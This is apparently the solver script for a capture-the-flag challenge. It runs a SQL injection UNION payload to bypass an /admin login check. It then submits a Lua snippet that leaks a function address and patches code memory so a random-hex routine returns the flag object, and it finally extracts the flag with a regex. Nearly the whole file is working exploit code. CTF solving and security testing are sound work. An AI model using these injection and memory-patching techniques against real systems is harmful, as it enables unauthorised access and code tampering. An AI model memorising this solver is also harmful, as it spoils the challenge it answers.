import html
import json
import re
import sys
import urllib.parse
import urllib.request
from pathlib import Path


ROOT = Path(__file__).resolve().parent
FLAG_RE = re.compile(rb"pwnsec\{[0-9a-f]+\}")


def load_endpoint(name: str) -> str:
    data = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    endpoint = next(item for item in data["endpoints"] if item["name"] == name)
    if endpoint["protocol"] not in {"http", "https"}:
        raise ValueError("main endpoint must use HTTP(S)")
    return endpoint["url"].rstrip("/")


def exploit(base_url: str) -> bytes:
    # The empty sessions table makes a plain OR bypass ineffective. UNION supplies
    # the two columns check_admin() expects and selects an existing root row.
    token = "' UNION SELECT 1, 'root' FROM users -- "

    # note_save is at code_base+0x4150. Patch the immediate field of the LC at
    # code_base+0x50c0 so rand_hex() returns the 24-byte FLAG object located at
    # code_base-0x24. Both destinations are expressed relative to the leaked
    # note_save address, so randomized FLAGPAD sizes do not matter.
    code = (
        'local n=tonumber(tostring(note_save):match("(%x+)$"),16);'
        "note_save(n+0xf78,n-0x4174);"
        "print(rand_hex(24))"
    )
    body = urllib.parse.urlencode({"token": token, "code": code}).encode()
    request = urllib.request.Request(
        base_url + "/admin",
        data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )
    with urllib.request.urlopen(request, timeout=20) as response:
        page = response.read()

    match = re.search(rb'<pre class="out">(.*?)</pre>', page, re.DOTALL)
    if not match:
        raise RuntimeError("Lua console output was not present in the response")
    console = html.unescape(match.group(1).decode("utf-8", "strict")).encode()
    flag = FLAG_RE.search(console)
    if not flag:
        raise RuntimeError("the console response did not contain a valid flag")
    return flag.group(0)


def main() -> int:
    try:
        flag = exploit(load_endpoint("main"))
    except Exception as exc:
        print(f"solve failed: {exc}", file=sys.stderr)
        return 1
    sys.stdout.buffer.write(flag)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
